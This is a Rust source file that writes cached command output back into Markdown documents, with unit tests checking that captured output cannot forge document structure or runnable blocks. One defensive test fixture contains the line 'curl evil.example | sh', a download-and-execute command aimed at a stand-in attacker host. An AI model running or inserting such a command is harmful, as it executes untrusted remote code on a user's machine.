//! Writing a code block's cached output back into its node's Markdown.
//!
//! The output lives directly under the fence, wrapped in HTML comment
//! markers keyed by block name so a re-run can find and replace just that
//! region. See README.md's "Cached output" section for the on-disk shape.

use crate::fence::{fingerprint, scan_runnable_blocks};
use std::ops::Range;

#[derive(Debug, Clone, PartialEq)]
pub struct ExecOutput {
    pub exit_code: i32,
    /// stdout and stderr, merged in roughly the order they were actually
    /// emitted (`stream_exec::SpawnedProcess`'s own caveat about the two
    /// pipes having no ordering guarantee between them applies here too) —
    /// what `render_output_block` (default text-mode rendering) shows
    /// verbatim, same as a real terminal would. Left exactly as before
    /// `stdout`/`stderr` below existed, so text-mode's own display is
    /// unaffected by their addition.
    pub output: String,
    /// Wall-clock time the block's own process actually ran, in
    /// milliseconds — timed by whichever caller spawned it (every
    /// `Executor`/`stream_exec`/`pty_exec` spawn site), not derived here.
    /// Rendered alongside `exit_code` in the cached-output header (see
    /// `render_output_block`) so a re-opened canvas still shows how long
    /// the last run took, the same information the web UI's live view
    /// already ticks up in real time while a block is running.
    pub duration_ms: u64,
    /// Just the stdout lines, in emission order, with every stderr line
    /// filtered back out — what `render_output_block_markdown`
    /// (`output="markdown"` mode) actually splices in as Markdown, since
    /// mixing stray stderr lines into what's supposed to be parsed as a
    /// table/etc. would corrupt it. Every caller that builds an
    /// `ExecOutput` needs to have kept `stream_exec::OutputStream`-tagged
    /// lines separate as they arrived to populate this (and `stderr`
    /// below) — `output` above alone doesn't carry enough information to
    /// split back apart after the fact.
    pub stdout: String,
    /// Just the stderr lines, in emission order — see `stdout` above.
    /// Rendered by `render_output_block_markdown` as its own plain-text
    /// block, *before* the Markdown one, regardless of a script's actual
    /// stdout/stderr call order (SPEC.md's "Cached output") — a
    /// `output="markdown"` block's whole point is treating stdout as
    /// structured content to parse, and stderr (warnings, progress,
    /// tracebacks) was never meant to be part of that.
    pub stderr: String,
}

fn start_marker(name: &str, hash: &str) -> String {
    format!("<!-- meshfox:output name=\"{name}\" hash=\"{hash}\" -->")
}

/// Just the `name=`-keyed prefix of `start_marker`, with no `hash=` (which
/// varies run to run) — what an *existing* marker for `block_name` is
/// actually matched against, both to find it for replacement
/// (`write_output`) and to read its stored hash back out
/// (`cached_output_hash`). A plain `starts_with` on this, rather than a
/// full literal match against a freshly-rendered `start_marker`, is what
/// lets a still-current marker (any hash) be found and replaced/read at
/// all — matching on the *new* hash would never find the *old* line.
fn start_marker_prefix(name: &str) -> String {
    format!("<!-- meshfox:output name=\"{name}\"")
}

const END_MARKER: &str = "<!-- /meshfox:output -->";

/// `duration_ms` as a short, human-readable duration — `"842ms"` under a
/// second, `"2.3s"` under a minute, `"1m 05s"` beyond that. Rounds rather
/// than truncates fractional seconds so a genuinely-just-under-a-second run
/// doesn't display as a suspicious `"0.0s"`.
pub fn format_duration_ms(duration_ms: u64) -> String {
    if duration_ms < 1000 {
        return format!("{duration_ms}ms");
    }
    let total_seconds = (duration_ms as f64 / 1000.0).round() as u64;
    if total_seconds < 60 {
        format!("{:.1}s", duration_ms as f64 / 1000.0)
    } else {
        format!("{}m {:02}s", total_seconds / 60, total_seconds % 60)
    }
}

/// A fence length guaranteed to not be closed early by anything in `body`:
/// one longer than the longest run of backticks `body` contains, and never
/// shorter than 3. `body` is a command's captured output, so it can contain
/// literally anything — including a run of backticks as long as (or longer
/// than) a fixed ` ```` ` would be.
fn safe_fence_len(body: &str) -> usize {
    let mut longest_run = 0;
    let mut run = 0;
    for c in body.chars() {
        if c == '`' {
            run += 1;
            longest_run = longest_run.max(run);
        } else {
            run = 0;
        }
    }
    (longest_run + 1).max(3)
}

fn render_output_block(name: &str, output: &ExecOutput, hash: &str) -> String {
    let body = format!(
        "exit code: {} · {}\n\n{}",
        output.exit_code,
        format_duration_ms(output.duration_ms),
        output.output.trim_end()
    );
    let fence = "`".repeat(safe_fence_len(&body));
    format!(
        "{start}\n{fence}text\n{body}\n{fence}\n{end}\n",
        start = start_marker(name, hash),
        end = END_MARKER,
    )
}

/// Neutralizes every literal `<!--` in `s` (`&lt;!--`) so no HTML/
/// `meshfox:*` comment — a canvas node/edge marker, this very region's own
/// `meshfox:output`/`/meshfox:output` delimiters, `meshfox:comment`/`var`/
/// `option` — can be forged by splicing a command's own stdout directly
/// into the document as real Markdown (`output="markdown"`, see
/// `render_output_block_markdown`). Unlike the default text-mode rendering
/// above, this content isn't wrapped in a fence — it's genuinely re-parsed
/// as Markdown/HTML by every downstream reader (this crate's own re-scan,
/// the web UI, static export), so an unescaped forged `<!-- meshfox:node
/// ... -->` here would otherwise become a real, adversarial canvas node —
/// or a forged ` ```bash name="..." cache ` fence (not an HTML comment, so
/// untouched by this escape, but excluded separately — see
/// `output_byte_ranges` and its callers in `candidate_fences`/
/// `scan_constraint_blocks`) a real, adversarial runnable/constraint
/// block — on the very next parse.
fn escape_html_comments(s: &str) -> String {
    s.replace("<!--", "&lt;!--")
}

/// Markdown-mode counterpart of `render_output_block` (opted into per
/// block via the fence's own `output="markdown"` attribute — see
/// `write_output`): the command's stdout (`output.stdout`, *not*
/// `output.output` — see `ExecOutput`'s own doc comments) is spliced in as
/// real Markdown instead of a passive `text` fence, so e.g. a `pandas`
/// `DataFrame` printed via `.to_markdown()` renders as an actual table
/// rather than preformatted text.
///
/// Any stderr (`output.stderr`) prints first, as its own ordinary
/// `​```text​` block — same shape `render_output_block` above always
/// uses, `safe_fence_len`-guarded the same way — regardless of where in
/// the script's own execution order those lines actually landed relative
/// to stdout (`stream_exec`'s two pipes have no ordering guarantee between
/// each other to begin with — see its own `OutputStream` doc comment):
/// stderr is warnings/progress/tracebacks, never itself meant to be parsed
/// as the block's structured Markdown content, so it's kept visually and
/// structurally separate rather than interleaved into it. Escaped the same
/// way stdout is below — not for rendering safety (it's fenced, so inert
/// either way) but so a stray literal `<!-- /meshfox:output -->` in a
/// command's own stderr can't be mistaken by `output_byte_ranges`'s own
/// (non-fence-aware) end-marker search for the real one.
///
/// No `exit code`/duration header on a successful run (nothing to say
/// beyond the content itself, same as a Jupyter `display_data` payload) —
/// only shown, as a leading bold line right before the stdout half, when
/// the block actually failed, since that's the one case the rendered
/// content alone might not make obvious.
fn render_output_block_markdown(name: &str, output: &ExecOutput, hash: &str) -> String {
    let mut body = String::new();
    let stderr_trimmed = output.stderr.trim_end();
    if !stderr_trimmed.is_empty() {
        let escaped = escape_html_comments(stderr_trimmed);
        let fence = "`".repeat(safe_fence_len(&escaped));
        body.push_str(&format!("{fence}text\n{escaped}\n{fence}\n\n"));
    }
    if output.exit_code != 0 {
        body.push_str(&format!(
            "**⚠ exit code: {} · {}**\n\n",
            output.exit_code,
            format_duration_ms(output.duration_ms)
        ));
    }
    body.push_str(&escape_html_comments(output.stdout.trim_end()));
    format!(
        "{start}\n\n{body}\n\n{end}\n",
        start = start_marker(name, hash),
        end = END_MARKER,
    )
}

/// Byte ranges of every `<!-- meshfox:output name="..." ... --> ...
/// <!-- /meshfox:output -->` region anywhere in `markdown`, fence-aware —
/// a marker shown literally inside a real code fence (e.g. documentation
/// demonstrating this exact syntax) isn't treated as a real region, same
/// as `meshfox:comment`/heading/node-comment scanning elsewhere
/// (`crate::comment`, `crate::mdcanvas::scan`'s own `fence_ranges`).
///
/// Two independent callers treat these ranges as opaque: `mdcanvas::scan`
/// (a heading, and any `meshfox:node`/`meshfox:edge` comment, inside one of
/// these ranges is never real canvas structure) and `fence::candidate_fences`
/// /`scan_constraint_blocks` (a fence inside one of these ranges is never a
/// real runnable/constraint block). Both exist so that whatever a command
/// prints, once captured here, can never manufacture real document
/// structure no matter how it's rendered back — plain-text (already safely
/// fenced) or, with `output="markdown"`, spliced in as real Markdown (kept
/// honest by `escape_html_comments` above for the comment half of that, and
/// by this function's own callers for the fence half).
///
/// Relies on a legitimately-written region never containing the literal
/// `<!-- /meshfox:output -->` text partway through — true for text mode
/// (always inside its own single fence) and, for markdown mode, exactly
/// what `escape_html_comments` guarantees at write time.
pub(crate) fn output_byte_ranges(markdown: &str) -> Vec<Range<usize>> {
    const START_PREFIX: &str = "<!-- meshfox:output ";
    let fence_ranges = crate::fence::fenced_byte_ranges(markdown);
    let in_fence = |pos: usize| fence_ranges.iter().any(|r| r.start <= pos && pos < r.end);

    let mut ranges = Vec::new();
    let mut search_from = 0;
    while let Some(rel) = markdown[search_from..].find(START_PREFIX) {
        let start = search_from + rel;
        if in_fence(start) {
            search_from = start + START_PREFIX.len();
            continue;
        }
        match markdown[start..].find(END_MARKER) {
            Some(rel_end) => {
                let end = start + rel_end + END_MARKER.len();
                ranges.push(start..end);
                search_from = end;
            }
            None => {
                // No matching end marker (malformed/truncated file) --
                // nothing to treat as opaque; keep scanning past just the
                // start marker itself rather than the whole rest of the
                // document.
                search_from = start + START_PREFIX.len();
            }
        }
    }
    ranges
}

/// Insert or update the cached-output region for the code block named
/// `block_name` in `markdown`. Returns `None` if no runnable block with
/// that name exists. `block_name` doubles as the node-id fallback
/// `scan_runnable_blocks` needs to resolve an implicitly-named lone
/// block — correct because callers always pass the block's already-
/// resolved effective name, which *is* the owning node's id in exactly
/// that case.
///
/// The marker written also carries `crate::fence::fingerprint(block)` —
/// `block` exactly as found here, i.e. the fence *as it stands in
/// `markdown` right now* — so a later reader (`cached_output_hash`) can
/// tell whether the fence has changed since this output was captured
/// without needing any separate session state; see SPEC.md's "Cached
/// output".
///
/// The block's own `output="markdown"` attribute (`render_output_block_markdown`
/// vs. the default `render_output_block`) picks how the captured stdout is
/// written back — see SPEC.md's "Cached output".
pub fn write_output(markdown: &str, block_name: &str, output: &ExecOutput) -> Option<String> {
    let blocks = scan_runnable_blocks(block_name, markdown);
    let block = blocks
        .iter()
        .find(|b| b.name.as_deref() == Some(block_name))?;
    let insert_point = block.span.end;
    let hash = fingerprint(block);
    let markdown_mode = block.attrs.get("output").map(String::as_str) == Some("markdown");
    let rendered = if markdown_mode {
        render_output_block_markdown(block_name, output, &hash)
    } else {
        render_output_block(block_name, output, &hash)
    };
    let marker = start_marker_prefix(block_name);

    let after = &markdown[insert_point..];
    let trimmed_after = after.trim_start_matches(['\n', ' ', '\t']);
    let gap = after.len() - trimmed_after.len();

    let mut result = String::with_capacity(markdown.len() + rendered.len());
    result.push_str(&markdown[..insert_point]);
    result.push('\n');
    result.push_str(&rendered);

    if trimmed_after.starts_with(&marker) {
        if let Some(end_idx) = trimmed_after.find(END_MARKER) {
            let region_end = gap + end_idx + END_MARKER.len();
            result.push_str(&markdown[insert_point + region_end..]);
            return Some(result);
        }
    }
    result.push_str(after);
    Some(result)
}

/// Reads back the `hash=` `write_output` embedded in `block_name`'s own
/// cached-output marker, if that block has cached output at all — the
/// counterpart read half of `write_output`'s own write, using the exact
/// same "look for the marker right after the fence's own span" locality
/// (not a whole-document text search, which a command's own captured
/// output could fool the same way `output_containing_backtick_runs_and_
/// headings_round_trips_safely` already guards `write_output` itself
/// against). `None` for a block with no cached output at all, or one
/// cached before this field existed.
pub fn cached_output_hash(markdown: &str, block_name: &str) -> Option<String> {
    let blocks = scan_runnable_blocks(block_name, markdown);
    let block = blocks
        .iter()
        .find(|b| b.name.as_deref() == Some(block_name))?;
    let after = &markdown[block.span.end..];
    let trimmed_after = after.trim_start_matches(['\n', ' ', '\t']);
    let prefix = start_marker_prefix(block_name);
    if !trimmed_after.starts_with(&prefix) {
        return None;
    }
    let line_end = trimmed_after.find("-->")? + "-->".len();
    let marker_line = &trimmed_after[..line_end];
    let inner = marker_line
        .strip_prefix("<!--")?
        .strip_suffix("-->")?
        .trim()
        .strip_prefix("meshfox:output")?;
    crate::attrs::parse_attrs(inner.trim()).remove("hash")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fence::scan_code_blocks;

    fn out(code: i32, s: &str) -> ExecOutput {
        ExecOutput {
            exit_code: code,
            output: s.to_string(),
            duration_ms: 0,
            stdout: s.to_string(),
            stderr: String::new(),
        }
    }

    #[test]
    fn format_duration_ms_under_a_second_is_milliseconds() {
        assert_eq!(format_duration_ms(0), "0ms");
        assert_eq!(format_duration_ms(842), "842ms");
    }

    #[test]
    fn format_duration_ms_under_a_minute_is_one_decimal_seconds() {
        assert_eq!(format_duration_ms(1000), "1.0s");
        assert_eq!(format_duration_ms(2340), "2.3s");
        assert_eq!(format_duration_ms(59_499), "59.5s");
    }

    #[test]
    fn format_duration_ms_right_at_the_minute_boundary_rounds_into_minutes() {
        // 59_999ms rounds to 60 whole seconds, which is no longer < 60 --
        // the boundary check uses the same rounded `total_seconds` the
        // "m/s" branch itself displays, so this is consistent rather than
        // a `"60.0s"` that never actually appears.
        assert_eq!(format_duration_ms(59_999), "1m 00s");
    }

    #[test]
    fn format_duration_ms_a_minute_or_more_is_minutes_and_seconds() {
        assert_eq!(format_duration_ms(60_000), "1m 00s");
        assert_eq!(format_duration_ms(65_000), "1m 05s");
        assert_eq!(format_duration_ms(3_725_000), "62m 05s");
    }

    #[test]
    fn write_output_renders_the_duration_alongside_the_exit_code() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        let result = ExecOutput {
            exit_code: 0,
            output: "ok".to_string(),
            duration_ms: 2300,
            stdout: "ok".to_string(),
            stderr: String::new(),
        };
        let updated = write_output(md, "build", &result).unwrap();
        assert!(updated.contains("exit code: 0 · 2.3s"), "{updated}");
    }

    #[test]
    fn inserts_output_when_absent() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        let updated = write_output(md, "build", &out(0, "ok")).unwrap();
        assert!(updated.contains("<!-- meshfox:output name=\"build\" hash=\""));
        assert!(updated.contains("exit code: 0"));
        assert!(updated.contains("ok"));
        assert!(updated.contains("<!-- /meshfox:output -->"));
        // the block is still there and still scannable
        let blocks = scan_code_blocks(&updated);
        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].name.as_deref(), Some("build"));
    }

    #[test]
    fn replaces_existing_output_in_place() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        let first = write_output(md, "build", &out(1, "first run failed")).unwrap();
        let second = write_output(&first, "build", &out(0, "second run ok")).unwrap();

        assert!(!second.contains("first run failed"));
        assert!(second.contains("second run ok"));
        assert!(second.contains("exit code: 0"));
        // exactly one marker pair, not stacked
        assert_eq!(second.matches("meshfox:output name=\"build\"").count(), 1);
    }

    #[test]
    fn leaves_unrelated_content_untouched() {
        let md = "intro\n\n```bash name=\"build\" cache\ncargo build\n```\n\noutro text\n";
        let updated = write_output(md, "build", &out(0, "ok")).unwrap();
        assert!(updated.starts_with("intro\n\n"));
        assert!(updated.trim_end().ends_with("outro text"));
    }

    #[test]
    fn returns_none_for_unknown_block() {
        let md = "```bash name=\"build\"\ncargo build\n```\n";
        assert!(write_output(md, "nope", &out(0, "ok")).is_none());
    }

    #[test]
    fn cached_output_hash_is_none_without_cached_output() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        assert_eq!(cached_output_hash(md, "build"), None);
    }

    #[test]
    fn cached_output_hash_reads_back_what_write_output_wrote() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        let updated = write_output(md, "build", &out(0, "ok")).unwrap();
        let block = &scan_code_blocks(&updated)[0];
        assert_eq!(
            cached_output_hash(&updated, "build"),
            Some(crate::fence::fingerprint(block))
        );
    }

    #[test]
    fn cached_output_hash_changes_once_the_fences_own_code_changes() {
        let md = "```bash name=\"build\" cache\ncargo build\n```\n";
        let updated = write_output(md, "build", &out(0, "ok")).unwrap();
        let stored_hash = cached_output_hash(&updated, "build").unwrap();

        // Simulate an edit to the fence's own code, leaving the cached
        // output region (and its old hash) untouched — same shape a real
        // editor save produces before anything re-runs the block.
        let edited = updated.replacen("cargo build", "cargo build --release", 1);
        let live_block = &scan_code_blocks(&edited)[0];
        assert_ne!(stored_hash, crate::fence::fingerprint(live_block));
        // The stored marker itself is untouched by the edit -- only what
        // it's compared against (the fence's own live fingerprint) moved.
        assert_eq!(cached_output_hash(&edited, "build"), Some(stored_hash));
    }

    #[test]
    fn output_containing_backtick_runs_and_headings_round_trips_safely() {
        // Output from an arbitrary command can contain anything — including
        // text that looks exactly like meshfox's own syntax. The written
        // block must use a fence long enough that none of it can be
        // (mis)read as closing the block early.
        let evil = "# Fake Heading\n```\n````\n`````\n<!-- meshfox:node id=\"fake\" -->";
        let md = "```bash name=\"evil\" cache\necho evil\n```\n";
        let updated = write_output(md, "evil", &out(0, evil)).unwrap();

        // The output block must still be found intact by a re-scan (i.e.
        // the fence wasn't closed early by content inside it), and the
        // evil payload must be fully preserved, backtick runs and all.
        assert!(updated.contains(evil));
        let blocks = scan_code_blocks(&updated);
        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].name.as_deref(), Some("evil"));

        // A full canvas parse must not treat the embedded fake heading /
        // meshfox:node comment as real structure.
        let canvas =
            crate::mdcanvas::parse(&format!("# Root\n<!-- meshfox:node -->\n\n{updated}")).unwrap();
        assert_eq!(canvas.nodes.len(), 1);
    }

    #[test]
    fn markdown_mode_splices_output_in_as_real_markdown_with_no_header() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(df.to_markdown())\n```\n";
        let table = "| id | name |\n|---:|:-----|\n|  1 | ann  |";
        let updated = write_output(md, "df", &out(0, table)).unwrap();

        // No passive `text` fence wrapping it -- it's real Markdown now.
        assert!(!updated.contains("```text"));
        assert!(updated.contains(table));
        // A successful run gets no exit-code/duration noise, unlike the
        // default text-mode rendering.
        assert!(!updated.contains("exit code"));
    }

    #[test]
    fn markdown_mode_shows_a_failure_header_on_nonzero_exit() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nraise ValueError()\n```\n";
        let updated = write_output(md, "df", &out(1, "Traceback...")).unwrap();
        assert!(updated.contains("**⚠ exit code: 1"));
        assert!(updated.contains("Traceback..."));
    }

    #[test]
    fn markdown_mode_prints_stderr_as_a_plain_text_block_before_the_markdown_stdout() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\n...\n```\n";
        let table = "| id |\n|---:|\n|  1 |";
        let result = ExecOutput {
            exit_code: 0,
            output: format!("warning: deprecated\n{table}"),
            duration_ms: 0,
            stdout: table.to_string(),
            stderr: "warning: deprecated".to_string(),
        };
        let updated = write_output(md, "df", &result).unwrap();

        // stderr is a passive text fence, stdout is unwrapped Markdown --
        // and stderr comes first, regardless of `output`'s own (merged,
        // unused here) interleaving.
        let stderr_pos = updated.find("```text").unwrap();
        let stderr_line_pos = updated.find("warning: deprecated").unwrap();
        let table_pos = updated.find(table).unwrap();
        assert!(stderr_pos < stderr_line_pos);
        assert!(stderr_line_pos < table_pos);
        // No spurious second `text` fence wrapping the stdout half.
        assert_eq!(updated.matches("```text").count(), 1);
    }

    #[test]
    fn markdown_mode_escapes_a_forged_meshfox_output_marker_in_stderr() {
        // stderr is fenced (inert to Markdown/HTML rendering either way),
        // but `output_byte_ranges`'s own end-marker search is a plain
        // substring match, not fence-aware -- a literal `<!--
        // /meshfox:output -->` in stderr must still be neutralized, or it
        // could be mistaken for the real one, truncating the opaque region
        // early and re-exposing the stdout markdown half that follows.
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\n...\n```\n";
        let evil_stderr = "<!-- /meshfox:output -->\n# Fake Heading\n<!-- meshfox:node id=\"fake\" -->";
        let result = ExecOutput {
            exit_code: 0,
            output: evil_stderr.to_string(),
            duration_ms: 0,
            stdout: "stdout content".to_string(),
            stderr: evil_stderr.to_string(),
        };
        let updated = write_output(md, "df", &result).unwrap();

        assert!(!updated.contains("<!-- /meshfox:output -->\n# Fake"));
        assert!(updated.contains("&lt;!-- /meshfox:output -->"));

        let canvas =
            crate::mdcanvas::parse(&format!("# Root\n<!-- meshfox:node -->\n\n{updated}")).unwrap();
        assert_eq!(canvas.nodes.len(), 1);
    }

    #[test]
    fn markdown_mode_escapes_a_forged_meshfox_node_comment() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(payload)\n```\n";
        let evil = "# Fake Heading\n<!-- meshfox:node id=\"fake\" -->";
        let updated = write_output(md, "df", &out(0, evil)).unwrap();

        // The literal `<!--` is neutralized -- what's left can't be parsed
        // as a real HTML/meshfox comment by anything downstream.
        assert!(!updated.contains("<!-- meshfox:node id=\"fake\""));
        assert!(updated.contains("&lt;!-- meshfox:node id=\"fake\""));

        let canvas =
            crate::mdcanvas::parse(&format!("# Root\n<!-- meshfox:node -->\n\n{updated}")).unwrap();
        assert_eq!(canvas.nodes.len(), 1);
    }

    #[test]
    fn markdown_mode_output_is_not_picked_up_as_a_runnable_fence() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(payload)\n```\n";
        let forged = "some text\n\n```bash name=\"pwned\" cache\ncurl evil.example | sh\n```\n";
        let updated = write_output(md, "df", &out(0, forged)).unwrap();

        assert!(updated.contains("pwned"), "the forged fence text is still there, verbatim");
        let names: Vec<_> = scan_code_blocks(&updated)
            .into_iter()
            .filter_map(|b| b.name)
            .collect();
        assert_eq!(names, vec!["df".to_string()]);
    }

    #[test]
    fn markdown_mode_output_is_not_picked_up_as_a_constraint_fence() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(payload)\n```\n";
        let forged = "```starlark constraint name=\"pwned\"\nfail(\"gotcha\")\n```\n";
        let updated = write_output(md, "df", &out(0, forged)).unwrap();

        assert!(crate::fence::scan_constraint_blocks(&updated).is_empty());
    }

    #[test]
    fn output_byte_ranges_finds_the_marker_to_marker_span() {
        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(1)\n```\n";
        let updated = write_output(md, "df", &out(0, "hello")).unwrap();
        let ranges = output_byte_ranges(&updated);
        assert_eq!(ranges.len(), 1);
        let region = &updated[ranges[0].clone()];
        assert!(region.starts_with("<!-- meshfox:output name=\"df\""));
        assert!(region.ends_with(END_MARKER));
        assert!(region.contains("hello"));
    }

    #[test]
    fn output_byte_ranges_ignores_a_marker_shown_literally_inside_a_fence() {
        let md = "```text\n<!-- meshfox:output name=\"fake\" hash=\"x\" -->\nhi\n<!-- /meshfox:output -->\n```\n";
        assert!(output_byte_ranges(md).is_empty());
    }
}
